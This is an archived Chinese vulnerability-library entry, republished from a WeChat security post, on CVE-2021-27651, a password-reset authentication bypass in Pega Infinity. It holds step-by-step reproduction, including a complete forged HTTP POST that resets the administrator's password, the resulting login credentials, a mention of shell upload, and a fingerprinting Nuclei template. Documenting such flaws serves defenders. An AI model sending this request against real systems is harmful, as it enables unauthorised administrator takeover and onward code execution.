---
source: "gelusus/wxvl 公众号漏洞文库"
title: "Pega Infinity 密码重置流程认证绕过"
product: "Pega Infinity"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2021-27651"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "文称8.2.1–8.5.2；启用本地账号密码重置"
prerequisites: "匿名初始会话，需目标账号和实例路径"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Pega/Pega%20Infinity%20-%20%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81.md"
id: "vw-7eb05b07888cdc79cc8ed68f"
entity_id: "ve-7eb05b07888cdc79cc8ed68f"
schema_version: "1"
---

# Pega Infinity 密码重置流程认证绕过

## 条目说明

- 对象与具体问题：Pega Infinity；密码重置流程认证绕过
- 版本、配置及部署条件：文称8.2.1–8.5.2；启用本地账号密码重置
- 认证与权限前提：匿名初始会话，需目标账号和实例路径
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 正文含重置账号的变更副作用，应明确不是只读检测；账号示例不保证每站存在
- 末尾名为POC的Nuclei只匹配公开API文档Pega API，并不验证27651，低危标注也是指纹级别
- shell上传为后认证链仅图片
- Exploit Video空节，无修复版本/原始公告链接

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

_7ingLian  偏远酒馆   2025-04-24 03:36  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FC5MrZn00B8rdTgvHWpYMUgS8iaDTicmb1obUoN8VEkvwY92XMr7XIfXGw/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC6TPeG2dkwjCcbyCSX68lItlSsQFThaWupVms88KGHQMozur7n83IBgQe13iboB9k4QX9mmbyqWbOw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
CVE-2021-27651  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/l8UzsHjZBUkicvzLrJysUqiavdGwOPVCtxzkH7GfsKt6awLq96X4RqeGuay4CfPnLm7J1Oh2INENyooZrEDqaicNA/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**免责声明**  
  
  
  
我们发布的内容仅作为测试和学习交流，禁止用于未授权场景。任何人不得将其用于非法目的。我方对于阅读本文技术引起的法律责任概不负责。  
  
  
  
--->漏洞描述  
  
Pega Infinity 版本8.2.1到8.5.2包含身份验证绕过漏洞，因为本地账户的密码重置功能可用于绕过本地身份验证检查。  
  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td colspan="4" data-colwidth="118,166,126,270" valign="bottom" align="center" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;color: rgb(205, 205, 205) !important;background-color: rgb(122, 68, 66);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163);font-family: 苹方简常规;font-size: 16px;letter-spacing: 0.544px;text-align: left;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;letter-spacing: 0.544px;caret-color: red;font-size: 14px;text-indent: 0em;color: rgb(255, 255, 255);visibility: visible;"><span leaf="">漏洞概述</span></span></strong></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;visibility: visible;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(0, 122, 170);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span class="js_darkmode__7" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;background-color: rgb(255, 255, 255);color: rgb(122, 68, 66);font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;letter-spacing: 0.544px;text-align: center;visibility: visible;"><span leaf="">漏洞名称</span></span></strong></span></p></td><td colspan="3" data-colwidth="166,126,270" width="270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__8" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><span leaf="">Pega Infinity - 绕过身份验证</span></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;visibility: visible;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__9" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="">漏洞编号</span></strong></span></p></td><td colspan="3" data-colwidth="166,126,270" width="270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__10" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><span leaf="">CVE-2021-27651</span></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span class="js_darkmode__11" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">公开时间</span><span leaf=""><br/></span></span></strong></p></td><td colspan="3" data-colwidth="166,126,270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><span class="js_darkmode__12" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">2021</span></span></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__13" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">漏洞等级</span></strong></span></p></td><td data-colwidth="166" width="166" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__14" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">严重</span></span></p></td><td data-colwidth="126" width="126" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span class="js_darkmode__15" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">评分</span></span></strong></p></td><td data-colwidth="270" width="144" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__16" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">9.8</span></span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(0, 122, 170);"></span></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__17" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">POC是否公开</span></strong></span></p></td><td data-colwidth="166" width="166"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;clear: both;min-height: 1em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;color: rgb(122, 68, 66);box-sizing: border-box !important;overflow-wrap: break-word !important;">是</span></p></td><td data-colwidth="126" width="126" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__19" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">EXP是否公开</span></strong></span></p></td><td data-colwidth="270" width="144" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__20" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">是</span></span></p></td></tr></tbody></table>  
  
--->影响版本  
  
Pega Infinity >= 8.2.1 Pega Infinity <= 8.5.2  
  
  
--->漏洞详情  
  
An attacker can bypass all stages of the password reset flow and reset any user's account on Pega infinity. This is done by (1) initiating the password reset flow and typing in the victim email, then (2) forcing the HTTP POST request to update the password through. An attacker could login using the newly edited account and fully compromise the Pega instance via the many acceptable post-auth code execution vectors (modifying dynamic pages, templating, etc.)  
  
  
--->漏洞复现  
  
1. Browse to the login page of any Pega instance  
  
  
2. Click "reset password"  
  
  
3. Type in "administrator@pega.com", proxy the HTTP request, send the HTTP request with the "administrator@pega.com" to the Burp repeater tab or any similar tab, then allow the request to go through by disabling the proxy or clicking "send"  
  
  
4. After allowing the initial request to go through, modify the HTTP requests body in the repeater so it includes the following data...  
```http
POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://redacted.com
DNT: 1
Connection: close
Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
Cookie: yourCookie
Upgrade-Insecure-Requests: 1

pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=
```  
  
5. Login using the following credentials after sending the HTTP request, having bypassed the confirmation part of reset password and being able to login to the administrator account...  
```
administrator@pega.com / Rules@1234
```  
  
![Password bypass](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FCPaiapzXby7haa7uNLic38gC9h8HmSczPxFHn58buQcP7cEBdyic60eL8w/640?wx_fmt=png&from=appmsg "")  
  
Password bypass  
  
Remote code execution via shell upload  
  
![Remote code execution via shell upload](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FCicYhRRIePz66p2XkgcUnClkrianf8mP43rOia12Wy6vgjHUic2c1u5KwkQ/640?wx_fmt=png&from=appmsg "")  
  
  
--->POC  
```
id: pega

info:
  name: Pega Infinity Login
  author: sshell
  severity: low

requests:
  - method: GET
    path:
      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    matchers:
      - type: word
        words:
          - "Pega API"
```  
  
--->Exploit Video  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
